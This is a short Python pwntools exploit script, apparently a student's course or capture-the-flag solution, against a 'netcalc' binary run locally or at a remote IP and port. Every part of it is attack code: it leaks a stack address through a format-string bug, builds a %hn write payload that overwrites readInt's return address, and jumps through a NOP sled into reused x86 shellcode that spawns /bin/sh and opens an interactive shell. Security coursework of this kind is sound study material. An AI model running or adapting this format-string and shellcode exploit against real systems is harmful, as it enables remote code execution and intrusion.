#Hyuntae Kim, 20184276
from pwn import *

#reused shellcode --> http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"\
        "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

REMOTE = False

if (REMOTE == False):
    s = process('./netcalc')
else:
    s = remote('143.248.38.212', 10006)

s.recvuntil('Enter your choice (1-3):\n')
s.sendline('%x')
tmp = s.recvuntil('Enter your choice (1-3):\n')

#calculate next readInt's &buffer
next_readint_buf_addr = int(tmp.split('\n')[1], 16) - 12
print hex(next_readint_buf_addr)

#calculate next readInt's &return_address.
#+0x200 for buffer of readInt()
#+4 for num variable of readInt()
#+4 for SFP of readInt()
next_readint_ret_addr = next_readint_buf_addr + 0x200 + 4 + 4
print hex(next_readint_ret_addr)

#below format string bug payload is to overwrite readInt()'s return
#address to (&buf+0x50).
#buf will be consisted of like below:
#(FSB payload | NOP until 0x80 bytes | shellcode | NOP until 0x1ff bytes)
payload = p32(next_readint_ret_addr)
payload += p32(next_readint_ret_addr + 2)
if (REMOTE == False):
    payload += '%' + str(((next_readint_buf_addr+0x50) & 0xffff) - len(payload)) + 'c%2$hn'
    payload += '%' + str((((next_readint_buf_addr+0x50) & 0xffff0000) >> 16) - ((next_readint_buf_addr+0x50) & 0xffff)) + 'c%3$hn'
else:
    payload += '%' + str((((next_readint_buf_addr+0x50) & 0xffff0000) >> 16) - len(payload)) + 'c%3$hn'
    payload += '%' + str(((next_readint_buf_addr+0x50) & 0xffff) - (((next_readint_buf_addr+0x50) & 0xffff0000) >> 16)) + 'c%2$hn'
payload += '\x90' * (0x80 - len(payload))
payload += shellcode
payload += '\x90' * (0x1ff - len(payload))

s.sendline(payload)
s.interactive()



